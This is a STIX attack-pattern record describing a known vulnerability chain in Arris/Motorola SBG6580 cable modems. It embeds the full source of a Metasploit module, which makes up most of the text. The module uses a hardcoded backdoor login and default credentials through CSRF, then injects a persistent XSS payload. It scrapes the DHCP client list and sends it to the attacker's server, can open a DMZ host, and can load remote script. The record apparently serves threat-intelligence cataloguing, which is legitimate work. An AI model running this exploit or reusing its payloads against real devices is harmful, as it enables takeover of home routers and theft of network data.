{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--1a2a218d-eb3a-4ca0-948c-2cadb7e0c32c",
    "created": "2024-08-14T16:23:48.287694Z",
    "modified": "2024-08-14T16:23:48.287698Z",
    "name": "Arris / Motorola Surfboard SBG6580 Web Interface Takeover",
    "description": " The web interface for the Arris / Motorola Surfboard SBG6580 has several vulnerabilities that, when combined, allow an arbitrary website to take control of the modem, even if the user is not currently logged in. The attacker must successfully know, or guess, the target's internal gateway IP address. This is usually a default value of 192.168.0.1.  First, a hardcoded backdoor account was discovered in the source code of one device with the credentials \"technician/yZgO8Bvj\". Due to lack of CSRF in the device's login form, these credentials - along with the default \"admin/motorola\" - can be sent to the device by an arbitrary website, thus inadvertently logging the user into the router.  Once successfully logged in, a persistent XSS vulnerability is exploited in the firewall configuration page. This allows injection of Javascript that can perform any available action in the router interface.  The following firmware versions have been tested as vulnerable:  SBG6580-6.5.2.0-GA-06-077-NOSH, and SBG6580-8.6.1.0-GA-04-098-NOSH ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/admin/http/arris_motorola_surfboard_backdoor_xss.rb",
            "external_id": "arris_motorola_surfboard_backdoor_xss.rb"
        },
        {
            "source_name": "reference",
            "url": "https://www.rapid7.com/blog/post/2015/06/05/r7-2015-01-csrf-backdoor-and-persistent-xss-on-arris-motorola-cable-modems/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpServer::HTML\n  include Msf::Auxiliary::Report\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Arris / Motorola Surfboard SBG6580 Web Interface Takeover',\n        'Description' => %q{\n          The web interface for the Arris / Motorola Surfboard SBG6580 has\n          several vulnerabilities that, when combined, allow an arbitrary website to take\n          control of the modem, even if the user is not currently logged in. The attacker\n          must successfully know, or guess, the target's internal gateway IP address.\n          This is usually a default value of 192.168.0.1.\n\n          First, a hardcoded backdoor account was discovered in the source code\n          of one device with the credentials \"technician/yZgO8Bvj\". Due to lack of CSRF\n          in the device's login form, these credentials - along with the default\n          \"admin/motorola\" - can be sent to the device by an arbitrary website, thus\n          inadvertently logging the user into the router.\n\n          Once successfully logged in, a persistent XSS vulnerability is\n          exploited in the firewall configuration page. This allows injection of\n          Javascript that can perform any available action in the router interface.\n\n          The following firmware versions have been tested as vulnerable:\n\n          SBG6580-6.5.2.0-GA-06-077-NOSH, and\n          SBG6580-8.6.1.0-GA-04-098-NOSH\n        },\n        'Author' => [ 'joev' ],\n        'DisclosureDate' => '2015-04-08',\n        'License' => MSF_LICENSE,\n        'Actions' => [[ 'WebServer', { 'Description' => 'Serve exploit via web server' } ]],\n        'PassiveActions' => [ 'WebServer' ],\n        'DefaultAction' => 'WebServer',\n        'References' => [\n          [ 'CVE', '2015-0964' ], # XSS vulnerability\n          [ 'CVE', '2015-0965' ], # CSRF vulnerability\n          [ 'CVE', '2015-0966' ], # \"techician/yZgO8Bvj\" web interface backdoor\n          [ 'URL', 'https://www.rapid7.com/blog/post/2015/06/05/r7-2015-01-csrf-backdoor-and-persistent-xss-on-arris-motorola-cable-modems/' ],\n        ]\n      )\n    )\n\n    register_options([\n      OptString.new('DEVICE_IP', [\n        false,\n        'Internal IP address of the vulnerable device.',\n        '192.168.0.1'\n      ]),\n      OptString.new('LOGINS', [\n        false,\n        'Comma-separated list of user/pass combinations to attempt.',\n        'technician/yZgO8Bvj,admin/motorola'\n      ]),\n      OptBool.new('DUMP_DHCP_LIST', [\n        true,\n        'Dump the MAC, IP, and hostnames of all registered DHCP clients.',\n        true\n      ]),\n      OptInt.new('SET_DMZ_HOST', [\n        false,\n        'The final octet of the IP address to set in the DMZ (1-255).',\n        nil\n      ]),\n      OptString.new('BLOCK_INTERNET_ACCESS', [\n        false,\n        'Comma-separated list of IP addresses to block internet access for.',\n        ''\n      ]),\n      OptString.new('CUSTOM_JS', [\n        false,\n        'A string of javascript to execute in the context of the device web interface.',\n        ''\n      ]),\n      OptString.new('REMOTE_JS', [\n        false,\n        'A URL to inject into a script tag in the context of the device web interface.',\n        ''\n      ])\n    ])\n  end\n\n  def run\n    if datastore['SET_DMZ_HOST']\n      dmz_host = datastore['SET_DMZ_HOST'].to_i\n      if dmz_host < 1 || dmz_host > 255\n        raise ArgumentError, 'DMZ host must be an integer between 1 and 255.'\n      end\n    end\n\n    exploit\n  end\n\n  def on_request_uri(cli, request)\n    if request.method =~ /post/i\n      file = store_loot(\n        'dhcp.clients', 'text/json', cli.peerhost,\n        request.body, 'arris_surfboard_xss', 'DHCP client list gathered from modem'\n      )\n      print_good \"Dumped DHCP client list from #{cli.peerhost}\"\n      print_good file\n    elsif request.uri =~ %r{/dmz$}i\n      print_good \"DMZ host successfully reset to #{datastore['SET_DMZ_HOST']}.\"\n      send_response_html(cli, '')\n    else\n      send_response_html(cli, exploit_html)\n    end\n  end\n\n  def set_dmz_host_js\n    return '' unless datastore['SET_DMZ_HOST'].present?\n\n    %|\n      var x = new XMLHttpRequest;\n      x.open('POST', '/goform/RgDmzHost.pl');\n      x.setRequestHeader('Content-Type','application/x-www-form-urlencoded');\n      x.send('DmzHostIP3=#{datastore['SET_DMZ_HOST']}');\n      top.postMessage(JSON.stringify({type:'dmz',done:true}), '*');\n    |\n  end\n\n  def dump_dhcp_list_js\n    return '' unless datastore['DUMP_DHCP_LIST']\n\n    %|\n      var f = document.createElement('iframe');\n      f.src = '/RgDhcp.asp';\n      f.onload = function() {\n        var mac = f.contentDocument.querySelector('input[name=\"dhcpmacaddr1\"]');\n        var rows = [];\n        if (mac) {\n          var tr = mac.parentNode.parentNode;\n          while (tr) {\n            if (tr.tagName === 'TR' && !tr.querySelector('input[type=\"Submit\"]')) {\n              var tds = [].slice.call(tr.children);\n              var row = [];\n              rows.push(row);\n              for (var i in tds) {\n                row.push(tds[i].innerText);\n              }\n            }\n            tr = tr.nextSibling;\n          }\n        }\n        if (rows.length > 0) {\n          top.postMessage(JSON.stringify({type:'dhcp',rows:rows}), '*');\n          document.body.removeChild(f);\n        }\n      };\n      document.body.appendChild(f);\n    |\n  end\n\n  def exploit_js\n    [\n      dump_dhcp_list_js,\n      set_dmz_host_js,\n      custom_js\n    ].join(\"\\n\")\n  end\n\n  def exploit_html\n    <<~EOS\n      <!doctype html>\n      <html>\n      <body>\n\n      <script>\n\n      window.onmessage = function(e) {\n        var data = JSON.parse(e.data);\n        if (data.type == 'dhcp') {\n          var rows = JSON.stringify(data.rows);\n          var xhr = new XMLHttpRequest();\n          xhr.open('POST', '#{get_uri}/collect');\n          xhr.send(rows);\n        } else if (data.type == 'dmz') {\n          var xhr = new XMLHttpRequest();\n          xhr.open('GET', '#{get_uri}/dmz');\n          xhr.send();\n        }\n      }\n\n      var js = (#{JSON.generate({ js: exploit_js })}).js;\n\n      var HIDDEN_STYLE =\n        'position:absolute;left:-9999px;top:-9999px;';\n\n      function exploit(hosts, logins) {\n        for (var idx in hosts) {\n          buildImage(hosts[idx]);\n        }\n\n        function buildImage(host) {\n          var img = new Image();\n          img.src = host + '/images/px1_Ux.png';\n          img.setAttribute('style', HIDDEN_STYLE);\n          img.onload = function() {\n            if (img.width === 1 && img.height === 1) {\n              deviceFound(host, img);\n            }\n            img.parentNode.removeChild(img);\n          };\n          img.onerror = function() {\n            img.src = host + '/logo_new.gif';\n            img.onload = function() {\n              if (img.width === 176 && img.height === 125) {\n                deviceFound(host, img);\n              }\n            }\n            img.onerror = function() {\n              img.parentNode.removeChild(img);\n            };\n          };\n          document.body.appendChild(img);\n        }\n\n        function deviceFound(host, img) {\n          // but also lets attempt to log the user in with every login\n          var count = 0;\n          for (var idx in logins) {\n            attemptLogin(host, logins[idx], function() {\n              if (++count >= logins.length) {\n                attemptExploit(host);\n              }\n            })\n          }\n        }\n\n        function attemptExploit(host) {\n          var form = document.createElement('form');\n          form.setAttribute('style', HIDDEN_STYLE);\n          form.setAttribute('method', 'POST');\n          form.setAttribute('action', host+'/goform/RgFirewallEL')\n          document.body.appendChild(form);\n\n          var inputs = [];\n          var inputNames = [\n            'EmailAddress', 'SmtpServerName', 'SmtpUsername',\n            'SmtpPassword', 'LogAction'\n          ];\n\n          var input;\n          for (var idx in inputNames) {\n            input = document.createElement('input');\n            input.setAttribute('type', 'hidden');\n            input.setAttribute('name', inputNames[idx]);\n            form.appendChild(input);\n            inputs.push(input)\n          }\n          inputs[0].setAttribute('value', '<script>@a.com<script>eval(window.name);<\\\\/script>');\n          inputs[inputs.length-1].setAttribute('value', '0');\n\n          var iframe = document.createElement('iframe');\n          iframe.setAttribute('style', HIDDEN_STYLE);\n\n          window.id = window.id || 1;\n          var name = '/*abc'+(window.id++)+'*/ '+js;\n          iframe.setAttribute('name', name);\n          document.body.appendChild(iframe);\n\n          form.setAttribute('target', name);\n          form.submit();\n\n          setTimeout(function() {\n            iframe.removeAttribute('sandbox');\n            iframe.src = host+'/RgFirewallEL.asp';\n          }, 1000);\n        }\n\n        function attemptLogin(host, login, cb) {\n          try {\n            var xhr = new XMLHttpRequest();\n            xhr.open('POST', host+'/goform/login');\n            xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');\n            xhr.send('loginUsername='+encodeURIComponent(login[0])+\n                     '&loginPassword='+encodeURIComponent(login[1]));\n            xhr.onerror = function() {\n              cb && cb();\n              cb = null;\n            }\n          } catch(e) {};\n        }\n      }\n\n      var logins = (#{JSON.generate({ logins: datastore['LOGINS'] })}).logins;\n      var combos = logins.split(',');\n      var splits = [], s = '';\n      for (var i in combos) {\n        s = combos[i].split('/');\n        splits.push([s[0], s[1]]);\n      }\n\n      exploit(['http://#{datastore['DEVICE_IP']}'], splits);\n\n      </script>\n\n      </body>\n      </html>\n    EOS\n  end\n\n  def custom_js\n    rjs_hook + datastore['CUSTOM_JS']\n  end\n\n  def rjs_hook\n    remote_js = datastore['REMOTE_JS']\n    if remote_js.present?\n      \"var s = document.createElement('script');s.setAttribute('src', '#{remote_js}');document.body.appendChild(s); \"\n    else\n      ''\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2015-04-08"
}